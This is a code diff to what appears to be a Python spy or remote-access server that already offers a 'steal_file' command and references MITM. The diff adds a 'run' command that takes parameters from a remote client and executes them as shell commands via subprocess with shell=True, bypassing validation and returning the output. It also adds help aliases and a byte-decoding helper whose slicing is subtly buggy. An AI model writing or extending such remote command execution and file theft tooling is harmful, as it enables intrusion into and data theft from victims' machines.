@@ -1,3 +1,4 @@
+import subprocess
 from typing import Optional, Tuple, List, Callable
 import socket
 from . import *
@@ -51,6 +52,11 @@ class Server:
                     return self.execute_command(command, [params[0], self.client_address[0], MITM_DEFAULT_PORT])
             case "get_commands":
                 return get_commands(Spy) + parse_methods([(self.steal_file, "steal_file")])
+            case "help":
+                return get_commands(Spy) + parse_methods([(self.steal_file, "steal_file")])
+            case "?":
+                return get_commands(Spy) + parse_methods([(self.steal_file, "steal_file")])
+
 
         # if command in SPY_COMMANDS:
         #     command = SPY_COMMANDS[command]
@@ -59,11 +65,13 @@ class Server:
             match command:
                 case "steal_file":
                     function = self.steal_file
+                case "run":
+                    function = run_command
                 case _:
                     return str(Massages.INVALID_COMMAND.value)
-        if not is_valid_num_of_params(function, len(params)):
+        if not is_valid_num_of_params(function, len(params)) and function != run_command:
             return str(Massages.INVALID_NUMBER_OF_PARAMS.value)
-        if not cast_params(function, params):
+        if not cast_params(function, params) and function != run_command:
             return str(Massages.INVALID_PARAMS.value)
         try:
             result = function(*params)
@@ -145,9 +153,25 @@ def parse_methods(method_list: List[Tuple[Callable, str]]):
         msg += f"{name} - \n"
         sig = signature(method)
         for par_name, param in sig.parameters.items():
-            msg += f"\t{name}: \n" \
+            msg += f"\t{par_name}: \n" \
                    f"\t\tType: {param.annotation if param.annotation != param.empty else 'any'} \n" \
                    f"\t\tDefault: {param.default if param.default != param.empty else 'no default value'} \n"
     return msg
 
 
+def decode_always(msg: bytes) -> str:
+    """
+    gets byte and decode it but never fail because it skips the parts it can't decode.
+    """
+    result = ""
+    for i in range(len(msg)):
+        try:
+            msg[0:i].decode()
+        except UnicodeError:
+            return msg[0:i-1].decode() + decode_always(msg[i+1::])
+    return msg.decode()
+
+
+def run_command(*params) -> str:
+    result = subprocess.run(params, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+    return decode_always(result.stdout) + decode_always(result.stderr)
